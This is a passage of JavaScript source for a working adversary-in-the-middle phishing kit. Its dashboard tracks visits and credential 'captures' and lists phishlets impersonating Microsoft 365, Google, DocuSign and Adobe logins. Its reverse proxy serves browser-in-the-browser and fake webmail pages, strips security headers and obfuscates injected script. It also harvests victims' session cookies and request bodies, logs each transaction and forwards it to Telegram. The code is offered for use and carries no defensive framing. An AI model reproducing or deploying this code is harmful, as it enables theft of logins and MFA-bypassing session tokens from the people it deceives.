        const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
        
        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
        const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
        
        const todayCaptures = captures.filter(c => c.modified >= today);
        const weekCaptures = captures.filter(c => c.modified >= weekAgo);
        const monthCaptures = captures.filter(c => c.modified >= monthAgo);
        
        const conversionRate = {
            today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
            week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
            month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
            total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
        };
        
        const dailyCaptures = {};
        const dailyVisits = {};
        for (let i = 6; i >= 0; i--) {
            const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
            const key = d.toDateString();
            dailyCaptures[key] = 0;
            dailyVisits[key] = 0;
        }
        
        captures.forEach(c => {
            const key = new Date(c.modified).toDateString();
            if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++;
        });
        
        visits.forEach(v => {
            const key = new Date(v.timestamp).toDateString();
            if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
        });
        
        const domains = {};
        visits.forEach(v => {
            const url = v.url || '';
            const match = url.match(/https?:\/\/([^\/]+)/);
            if (match) {
                const domain = match[1];
                domains[domain] = (domains[domain] || 0) + 1;
            }
        });
        const topDomains = Object.entries(domains)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5)
            .map(([domain, count]) => ({ domain, count }));
        
        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
        
        res.json({
            success: true,
            analytics: {
                visits: {
                    total: visits.length,
                    today: todayVisits.length,
                    week: weekVisits.length,
                    month: monthVisits.length
                },
                captures: {
                    total: captures.length,
                    today: todayCaptures.length,
                    week: weekCaptures.length,
                    month: monthCaptures.length
                },
                conversionRate,
                uniqueIPs,
                dailyCaptures,
                dailyVisits,
                topDomains,
                captureTimeline: captures.map(c => ({
                    date: c.modified,
                    file: c.file,
                    size: c.size
                }))
            }
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/phishlets', (req, res) => {
    try {
        const phishletsPath = path.join(__dirname, 'phishlets.json');
        if (!fs.existsSync(phishletsPath)) {
            const defaultPhishlets = {
                "microsoft": {
                    "name": "Microsoft Office 365",
                    "icon": "microsoft",
                    "file": "index_smQGUDpTF7PN.html",
                    "entryPoint": "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/",
                    "enabled": true
                },
                "google": {
                    "name": "Google Workspace",
                    "icon": "google",
                    "file": "google_login.html",
                    "entryPoint": "/google/login?redirect_uri=https://accounts.google.com/",
                    "enabled": false
                },
                "docusign": {
                    "name": "DocuSign",
                    "icon": "docusign",
                    "file": "docusign_login.html",
                    "entryPoint": "/docusign/login?redirect_uri=https://account.docusign.com/",
                    "enabled": false
                },
                "adobe": {
                    "name": "Adobe Acrobat",
                    "icon": "adobe",
                    "file": "adobe_login.html",
                    "entryPoint": "/adobe/login?redirect_uri=https://account.adobe.com/",
                    "enabled": false
                }
            };
            fs.writeFileSync(phishletsPath, JSON.stringify(defaultPhishlets, null, 2));
            return res.json({ success: true, phishlets: defaultPhishlets });
        }
        
        const phishlets = JSON.parse(fs.readFileSync(phishletsPath, 'utf-8'));
        res.json({ success: true, phishlets });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/phishlets/toggle', (req, res) => {
    const { id, enabled } = req.body;
    try {
        const phishletsPath = path.join(__dirname, 'phishlets.json');
        const phishlets = JSON.parse(fs.readFileSync(phishletsPath, 'utf-8'));
        if (phishlets[id]) {
            phishlets[id].enabled = enabled;
            fs.writeFileSync(phishletsPath, JSON.stringify(phishlets, null, 2));
            res.json({ success: true });
        } else {
            res.status(404).json({ error: 'Phishlet not found' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ================================================
// 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁
// ================================================

const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);

    if (url.startsWith('/bitb')) {
        clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
        fs.createReadStream(path.join(__dirname, 'public', 'bitb.html')).pipe(clientResponse);
        return;
    }

    if (url === '/webmail' || url.startsWith('/webmail?')) {
        clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
        fs.createReadStream(path.join(__dirname, 'public', 'webmail.html')).pipe(clientResponse);
        return;
    }

    logVisit(clientRequest, clientResponse, currentSession || 'new').catch(() => {});

    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;

            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;

            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
        }
        catch (error) {
            displayError("Phishing URL parsing failed", error, url);
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
        }
    }

    else if (currentSession || url === PROXY_PATHNAMES.proxy) {
        if (url === PROXY_PATHNAMES.serviceWorker) {
            clientResponse.writeHead(200, {
                'Content-Type': 'text/javascript',
                'Cache-Control': 'no-store'
            });
            fs.createReadStream(url.slice(1)).pipe(clientResponse);
            return;
        }
        else if (url === PROXY_PATHNAMES.favicon) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
            clientResponse.end();
        }

        else {
            let clientRequestBody = [];
            clientRequest
                .on("error", (error) => {
                    displayError("Client request body retrieval failed", error, method, url);
                })
                .on("data", (chunk) => {
                    clientRequestBody.push(chunk);
                })
                .on("end", () => {
                    clientRequestBody = Buffer.concat(clientRequestBody).toString();

                    if (!currentSession) {
                        if (clientRequestBody) {
                            try {
                                clientRequestBody = JSON.parse(clientRequestBody);
                                const proxyRequestURL = new URL(clientRequestBody.url);
                                const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                if (proxyRequestURL.hostname === headers.host &&
                                    proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                    try {
                                        const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                        const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                        clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);

                                        VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                        VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                        VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                        VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                        VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                                        clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                        clientResponse.end();
                                    }
                                    catch (error) {
                                        displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                    }
                                } else {
                                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
                                    clientResponse.end();
                                }
                            } catch (error) {
                                displayError("Anonymous client request body parsing failed", error, clientRequestBody);
                            }
                        } else {
                            clientResponse.writeHead(301, { Location: REDIRECT_URL });
                            clientResponse.end();
                        }
                    }

                    else {
                        let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                        const proxyRequestOptions = {
                            hostname: VICTIM_SESSIONS[currentSession].hostname,
                            port: VICTIM_SESSIONS[currentSession].port,
                            method: method,
                            path: VICTIM_SESSIONS[currentSession].path,
                            headers: { ...headers },
                            rejectUnauthorized: false
                        };
                        let isNavigationRequest = false;

                        if (clientRequestBody) {
                            if (url === PROXY_PATHNAMES.jsCookie) {
                                updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                                const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                clientResponse.end(JSON.stringify(validDomains));
                                return;
                            }

                            else if (url === PROXY_PATHNAMES.proxy) {
                                try {
                                    clientRequestBody = JSON.parse(clientRequestBody);
                                    let proxyRequestURL = new URL(clientRequestBody.url);
                                    let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                    if (proxyRequestURL.hostname === headers.host) {
                                        if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                            try {
                                                const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                                VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                                VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                                VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                                                VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                                VICTIM_SESSIONS[currentSession].host = phishedURL.host;

                                                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
                                                clientResponse.end();
                                            }
                                            catch (error) {
                                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                            }
                                            return;
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                            const obfKey = generateObfuscationKey();
                                            const obfuscatedCode = obfuscateJSFile(PROXY_FILES.script, obfKey);
                                            clientResponse.writeHead(200, {
                                                'Content-Type': 'text/javascript',
                                                'Cache-Control': 'no-store'
                                            });
                                            clientResponse.end(obfuscatedCode);
                                            return;
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                            try {
                                                const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                                proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                                proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                                            }
                                            catch (error) {
                                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                                return;
                                            }
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                            updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
                                            const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                            clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                            clientResponse.end(JSON.stringify(validDomains));
                                            return;
                                        }
                                    }
                                    proxyRequestProtocol = proxyRequestURL.protocol;
                                    proxyRequestOptions.path = proxyRequestPath;
                                    proxyRequestOptions.port = proxyRequestURL.port;
                                    proxyRequestOptions.method = clientRequestBody.method;

                                    proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
                                    if (proxyRequestURL.hostname !== headers.host) {
                                        proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                        proxyRequestOptions.headers.host = proxyRequestURL.host;
                                    }
                                    if (proxyRequestOptions.headers.referer) {
                                        proxyRequestOptions.headers.referer = clientRequestBody.referrer;
                                    }
                                    isNavigationRequest = clientRequestBody.mode === "navigate";
                                }
                                catch (error) {
                                    displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                                }
                            } else {
                                console.warn(`/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`);
                            }
                        } else {
                            console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
                        }

                        proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                        updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                        const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
                        const requestContentLength = Buffer.byteLength(proxyRequestBody);
                        if (requestContentLength) {
                            proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
                        }
                        else {
                            delete proxyRequestOptions.headers["content-type"];
                            delete proxyRequestOptions.headers["content-length"];
                        }

                        if (isNavigationRequest) {
                            VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                            VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                            VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
                            VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                            VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                        }

                        makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest);
                    }
                });
        }
    }

    else {
        clientResponse.writeHead(301, { Location: REDIRECT_URL });
        clientResponse.end();
    }
});

// ================================================
// 𝙼𝙰𝙺𝙴 𝙿𝚁𝙾𝚇𝚈 𝚁𝙴𝚀𝚄𝙴𝚂𝚃
// ================================================

const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
    const protocol = proxyRequestProtocol === "https:" ? https : http;
    const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {

        logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
            .catch(error => displayError("Log encryption failed", error));

        if (isNavigationRequest &&
            proxyRequestOptions.headers.host === VICTIM_SESSIONS[currentSession].host &&
            proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {

            const proxyResponseLocation = proxyResponse.headers.location;
            if (proxyResponseLocation) {
                try {
                    const locationURL = new URL(proxyResponseLocation);

                    VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                    VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                    VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
                    VICTIM_SESSIONS[currentSession].port = locationURL.port;
                    VICTIM_SESSIONS[currentSession].host = locationURL.host;

                    proxyResponse.headers.location = proxyResponseLocation.replace(locationURL.host, proxyHostname);
                } catch {
                    VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
                }
            }
        }
        else if (proxyResponse.statusCode > 400) {
            displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
        }

        const proxyResponseCookie = proxyResponse.headers["set-cookie"];
        if (proxyResponseCookie) {
            updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
        }
        proxyResponse.headers["cache-control"] = "no-store";
        proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
        deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

        let serverResponseBody = [];
        proxyResponse
            .on("error", (error) => {
                displayError("Server response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path);
            })
            .on("data", (chunk) => {
                serverResponseBody.push(chunk);
            })
            .on("end", async () => {
                serverResponseBody = Buffer.concat(serverResponseBody);

                if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
                    Buffer.byteLength(serverResponseBody)) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateHTMLProxyResponse(decompressedResponseBody);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }

                else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateFederationRedirectUrl(decompressedResponseBody, proxyHostname);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("/common/GetCredentialType response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }

                clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                clientResponse.end(serverResponseBody);
            });
    });

    if (proxyRequestBody) {
        proxyRequest.write(proxyRequestBody);
    }
    proxyRequest.end();
};

// ================================================
// 𝙷𝙴𝙻𝙿𝙴𝚁 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽𝚂
// ================================================

function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name ?? error}`);
    console.error(`Message: ${error.message}`);
    console.error(`Stack trace: ${error.stack}`);

    for (let i = 0; i < args.length; i++) {
        console.error(`Parameter ${i + 1}: ${args[i]}`);
    }
    console.error("******************************");
}

function getUserSession(requestCookies) {
    if (!requestCookies) return;

    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");

        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
            VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });

    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);

    VICTIM_SESSIONS[cookieName] = {};
    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}.log`;
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);

    return {
        cookieName: cookieName,
        cookieValue: cookieValue
    };
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);

    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];

        cipher
            .on("error", (error) => {
                reject(error);
            })
            .on("data", (chunk) => {
                encryptedData.push(chunk);
            })
            .on("end", () => {
                resolve({
                    iv: iv.toString("hex"),
                    encryptedData: Buffer.concat(encryptedData).toString("hex")
                });
            });

        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
    const httpProxyTransaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    const logFileStream = LOG_FILE_STREAMS[currentSession];

    const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));

    if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }
    
    try {
        await sendToTelegram(httpProxyTransaction);
        console.log('✅ Telegram notification sent for:', proxyRequestOptions.path);
    } catch (telegramError) {
        console.error('❌ Telegram notification FAILED:', telegramError.message);
        console.error('   URL:', httpProxyTransaction.proxyRequestURL);
        try {
            fs.appendFileSync('telegram_errors.log', 
                `[${new Date().toISOString()}] ${telegramError.message} | ${httpProxyTransaction.proxyRequestURL}\n`);
        } catch (e) {}
    }
}

// ================================================
// 𝚁𝙴𝙼𝙰𝙸𝙽𝙸𝙽𝙶 𝙷𝙴𝙻𝙿𝙴𝚁 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽𝚂
// ================================================

function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
    const splitRequestHostname = requestHostname.split(".");
    const splitCookieDomain = cookieDomain.split(".");

    if (splitCookieDomain.length < 2) {
        return false;
    }
    if (cookieHostOnly && splitRequestHostname.length !== splitCookieDomain.length) {
        return false;
    }
    if (splitRequestHostname.length < splitCookieDomain.length) {
        return false;
    }

    for (let i = 1, l = splitCookieDomain.length + 1; i < l; i++) {
        if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) {
            return false;
        }
    }
    return true;
}

function isPathApplicable(requestPath, cookiePath) {
    const splitRequestPath = requestPath.split("/");
    const splitCookiePath = cookiePath.split("/");

    if (cookiePath === "/") {
        return true;
    }
    if (splitRequestPath.length < splitCookiePath.length) {
        return false;
    }

    for (let i = 1, l = splitCookiePath.length; i < l; i++) {
        if (splitCookiePath[i] !== splitRequestPath[i]) {
            return false;
        }
    }
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return (
        isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
        isPathApplicable(requestOptions.path, cookie.path)
    );
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const proxyRequestCookies = {};
    const currentTimestamp = Date.now();

    for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(currentTimestamp > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            proxyRequestCookies[cookie.name] = cookie.value;
        }
    }
    return Object.entries(proxyRequestCookies)
        .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
        .join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false;
    let foundDay = false;
    let foundMonth = false;
    let foundYear = false;

    let hourValue, minuteValue, secondValue;
    let dayValue, monthValue, yearValue;

    const delimiterRegex = /[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
    const dateTokens = cookieDate.split(delimiterRegex).filter(token => token);

    for (const token of dateTokens) {
        if (!foundTime) {
            const timeMatch = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);

            if (timeMatch) {
                foundTime = true;
                hourValue = parseInt(timeMatch[1]);
                minuteValue = parseInt(timeMatch[2]);
                secondValue = parseInt(timeMatch[3]);
                continue;
            }
        }
        if (!foundDay) {
            const dayMatch = /^(\d{1,2})(?:[^\d]|$)/.exec(token);

            if (dayMatch) {
                foundDay = true;
                dayValue = parseInt(dayMatch[1]);
                continue;
            }
        }
        if (!foundMonth) {
            const monthLowerCase = token.toLowerCase();
            const months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];

            for (let i = 0; i < months.length; i++) {
                if (monthLowerCase.startsWith(months[i])) {
                    foundMonth = true;
                    monthValue = i;
                    break;
                }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const yearMatch = /^(\d{2,4})(?:[^\d]|$)/.exec(token);

            if (yearMatch) {
                foundYear = true;
                yearValue = parseInt(yearMatch[1]);
                continue;
            }
        }
    }

    if (yearValue >= 70 && yearValue <= 99) {
        yearValue += 1900;
    } else if (yearValue >= 0 && yearValue <= 69) {
        yearValue += 2000;
    }

    if (!foundDay || !foundMonth || !foundYear || !foundTime) {
        return NaN;
    }
    if (dayValue < 1 || dayValue > 31) {
        return NaN;
    }
    if (yearValue < 1601) {
        return NaN;
    }
    if (hourValue > 23 || minuteValue > 59 || secondValue > 59) {
        return NaN;
    }

    const parsedCookieDate = new Date(Date.UTC(
        yearValue,
        monthValue,
        dayValue,
        hourValue,
        minuteValue,
        secondValue
    ));

    if (parsedCookieDate.getUTCFullYear() !== yearValue ||
        parsedCookieDate.getUTCMonth() !== monthValue ||
        parsedCookieDate.getUTCDate() !== dayValue) {
        return NaN;
    }
    return parsedCookieDate.getTime();
}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
    const currentTimestamp = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) {
        clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
    }

    for (const newCookie of newCookies) {
        const [cookie, ...attributes] = newCookie.split(";");
        const [cookieName, ...cookieValue] = cookie.split("=");

        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch ?? ["/"])[0];
        let cookieExpires = NaN;
        let cookieMaxAge = "";
        let cookieHostOnly = true;
        let isCookieValid = true;
        for (const attribute of attributes) {

            const cookieAttribute = attribute.trim();
            const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
            const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
            const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
            const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);

            if (cookieAttribute.toLowerCase() === "domain") {
                cookieDomain = request.hostname;
                cookieHostOnly = true;
                isCookieValid = true;
            }
            else if (cookieAttribute.toLowerCase() === "path") {
                cookiePath = (pathNameMatch ?? ["/"])[0];
            }
            else if (cookieAttribute.toLowerCase() === "expires") {
                cookieExpires = NaN;
            }
            else if (cookieAttribute.toLowerCase() === "max-age") {
                cookieMaxAge = "";
            }

            else if (cookieDomainMatch) {
                cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                cookieHostOnly = true;
                isCookieValid = true;

                if (!cookieDomain) {
                    cookieDomain = request.hostname;
                }
                else if (cookieDomain === proxyHostname) {
                    cookieDomain = request.hostname;
                    cookieHostOnly = false;
                }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    }
                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
                        isCookieValid = false;
                        continue;
                    }
                    cookieHostOnly = false;
                }
            }
            else if (cookiePathMatch) {
                cookiePath = cookiePathMatch[1].trim();

                if (!cookiePath.startsWith("/")) {
                    cookiePath = (pathNameMatch ?? ["/"])[0];
                }
            }
            else if (cookieExpiresMatch) {
                cookieExpires = cookieExpiresMatch[1].trim();

                cookieExpires = parseCookieDate(cookieExpires);
            }
            else if (cookieMaxAgeMatch) {
                cookieMaxAge = cookieMaxAgeMatch[1].trim();

                if (!/^-?\d+$/.test(cookieMaxAge)) {
                    cookieMaxAge = "";
                }
            }
        }
        if (!isCookieValid) {
            continue;
        }

        cookieExpires += clockSkew;
        if (cookieMaxAge) {
            const seconds = parseInt(cookieMaxAge);
            if (!isNaN(seconds)) {
                cookieExpires = currentTimestamp + seconds * 1000;
            }
        }

        let isNewCookie = true;

        for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
            const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];

            if (sessionCookie.name === cookieName &&
                sessionCookie.domain === cookieDomain &&
                sessionCookie.path === cookiePath &&
                sessionCookie.hostOnly === cookieHostOnly) {

                if (currentTimestamp > cookieExpires) {
                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
                    break;
                }
                sessionCookie.value = cookieValue.join("=");
                sessionCookie.expires = cookieExpires;
                isNewCookie = false;
                break;
            }
        }
        if (isNewCookie && !(currentTimestamp > cookieExpires)) {
            VICTIM_SESSIONS[currentSession].cookies.push({
                name: cookieName,
                value: cookieValue.join("="),
                domain: cookieDomain,
                path: cookiePath,
                expires: cookieExpires,
                hostOnly: cookieHostOnly
            });
        }
    }
}

function getValidDomains(domains) {
    const validDomains = [];

    for (const domain of domains) {
        const splitDomain = domain.split(".");
        for (let i = 2; i < splitDomain.length + 1; i++) {

            const validDomain = splitDomain.slice(-i).join(".");
            if (!validDomains.includes(validDomain)) {
